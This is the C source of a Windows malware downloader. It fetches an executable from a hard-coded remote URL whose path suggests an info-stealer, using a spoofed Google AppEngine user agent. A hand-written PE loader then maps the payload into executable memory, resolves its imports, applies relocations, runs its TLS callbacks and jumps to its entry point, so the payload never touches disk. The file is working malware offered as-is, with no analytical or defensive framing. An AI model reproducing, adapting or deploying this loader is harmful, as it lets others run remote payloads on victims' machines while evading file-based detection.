#include <windows.h>
#include <wininet.h>
#include "mem.h"
#pragma comment(linker, "/MERGE:.data=.text")
#pragma comment(linker, "/MERGE:.rdata=.text")
#pragma comment(linker, "/SECTION:.text,EWR")

int remoteFileSize(HINTERNET URLHandle) {
	char SBuffer[200];
	DWORD SBufferSize = 200;
	DWORD srv = 0;

	HttpQueryInfoA(URLHandle, HTTP_QUERY_CONTENT_LENGTH, SBuffer, &SBufferSize, &srv);
	
	typedef int(WINAPI* xAtoi)(const char*);
	xAtoi Atoi = (xAtoi)GetProcAddress(LoadLibraryA("ntdll.dll"), "atoi");

	return Atoi(SBuffer);
}

BYTE* downloadFileToMem(LPCSTR link, DWORD *size) {
	BOOL bResult;
	DWORD dwBytesRead = 1;

	if (HINTERNET hInternetSession = InternetOpenA("Mozilla/5.0 AppEngine-Google; (+http://code.google.com/appengine; appid: canisano)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)) {
		if (HINTERNET hURL = InternetOpenUrlA(hInternetSession, link, 0, 0, 0, 0)) {
			int sizeOfRemoteFile = remoteFileSize(hURL);

			if (BYTE* buf = (BYTE*)_alloc(sizeOfRemoteFile)) {

				InternetReadFile(hURL, buf, (DWORD)sizeOfRemoteFile, &dwBytesRead);
				InternetCloseHandle(hURL);
				InternetCloseHandle(hInternetSession);

				*size = sizeOfRemoteFile;
				return buf;
			}
		}
	}

	return 0;
}

void *loadPE(void *pData)
{
	DWORD secp2vmemp[2][2][2] = { { { PAGE_NOACCESS, PAGE_WRITECOPY },{ PAGE_READONLY, PAGE_READWRITE } },{ { PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY },{ PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE } } };
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pData;
	if (pDos->e_magic != IMAGE_DOS_SIGNATURE || (pDos->e_lfanew % sizeof(DWORD)) != 0) return NULL;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((DWORD)pData + pDos->e_lfanew);
	if (pNt->Signature != IMAGE_NT_SIGNATURE) return NULL;
	PIMAGE_OPTIONAL_HEADER pOpt = &pNt->OptionalHeader;
	PIMAGE_DATA_DIRECTORY pRelEntry = &pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (!pOpt->AddressOfEntryPoint || !pRelEntry->VirtualAddress) return NULL;
	LPVOID pBase = VirtualAlloc(NULL, pOpt->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pBase) return NULL;
	PIMAGE_SECTION_HEADER pSections = IMAGE_FIRST_SECTION(pNt);
	_copy(pBase, pData, pOpt->SizeOfHeaders);
	for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++)
		_copy((BYTE*)pBase + pSections[i].VirtualAddress, (BYTE*)pData + pSections[i].PointerToRawData, pSections[i].SizeOfRawData);
	if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
	{
		PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		while (pImport->Name)
		{
			LPSTR szMod = (LPSTR)((DWORD)pBase + pImport->Name);
			HMODULE hDll = LoadLibraryA(szMod);
			if (hDll)
			{
				PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((DWORD)pBase + pImport->OriginalFirstThunk);
				PIMAGE_THUNK_DATA pFunc = (PIMAGE_THUNK_DATA)((DWORD)pBase + pImport->FirstThunk);
				if (!pImport->OriginalFirstThunk) pThunk = pFunc;
				for (; pThunk->u1.AddressOfData; ++pFunc, ++pThunk)
				{
					char *funcName;
					if (pThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) funcName = (char*)(pThunk->u1.Ordinal & 0xFFFF);
					else funcName = (char*)((PIMAGE_IMPORT_BY_NAME)((char*)pBase + pThunk->u1.AddressOfData))->Name;
					pFunc->u1.Function = (DWORD)GetProcAddress(hDll, funcName);
				}
			}
			++pImport;
		}
	}

	PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)((DWORD)pBase + pRelEntry->VirtualAddress);
	PIMAGE_BASE_RELOCATION curReloc = pBaseReloc;
	DWORD relOffset = (DWORD)pBase - pOpt->ImageBase;
	PIMAGE_BASE_RELOCATION relocEnd = (PIMAGE_BASE_RELOCATION)((DWORD)pBaseReloc + pRelEntry->Size);
	while (curReloc < relocEnd && curReloc->VirtualAddress)
	{
		DWORD count = (curReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		PWORD curEntry = (PWORD)(curReloc + 1);
		DWORD pageVA = (DWORD)pBase + curReloc->VirtualAddress;
		for (; count; ++curEntry, --count) if ((*curEntry >> 12) == IMAGE_REL_BASED_HIGHLOW) *(DWORD*)((char *)pageVA + (*curEntry & 0x0fff)) += relOffset;
		curReloc = (PIMAGE_BASE_RELOCATION)((DWORD)curReloc + curReloc->SizeOfBlock);
	}

	DWORD_PTR dwProtect;
	VirtualProtect(pBase, pNt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &dwProtect);
	for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++)
	{
		void *section = (BYTE*)pBase + pSections[i].VirtualAddress;
		if (pSections[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE)
		{
			VirtualFree(section, pSections[i].Misc.VirtualSize, MEM_DECOMMIT);
			continue;
		}
		DWORD_PTR secp = pSections[i].Characteristics;
		DWORD_PTR vmemp = secp2vmemp[!!(secp & IMAGE_SCN_MEM_EXECUTE)][!!(secp & IMAGE_SCN_MEM_READ)][!!(secp & IMAGE_SCN_MEM_WRITE)];
		if (secp & IMAGE_SCN_MEM_NOT_CACHED) vmemp |= PAGE_NOCACHE;
		VirtualProtect(section, pSections[i].Misc.VirtualSize, vmemp, &dwProtect);
	}

	if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size)
	{
		PIMAGE_TLS_DIRECTORY pTls = (PIMAGE_TLS_DIRECTORY)((DWORD_PTR)pBase + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
		PIMAGE_TLS_CALLBACK* pCallback = (PIMAGE_TLS_CALLBACK*)pTls->AddressOfCallBacks;
		for (; pCallback && *pCallback; ++pCallback) (*pCallback)(pBase, DLL_PROCESS_ATTACH, 0);
	}
	return (LPVOID)((DWORD_PTR)pBase + pOpt->AddressOfEntryPoint);
}

int WinMainCRTStartup(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	DWORD fileSize = 0;
	BYTE* exeMemory = downloadFileToMem("http://my7.website/stmk/stlr.exe", &fileSize);
	if (fileSize != 0) {
		void *fake_entrypoint = loadPE(exeMemory);
		__asm call fake_entrypoint
	}

	ExitProcess(0);
}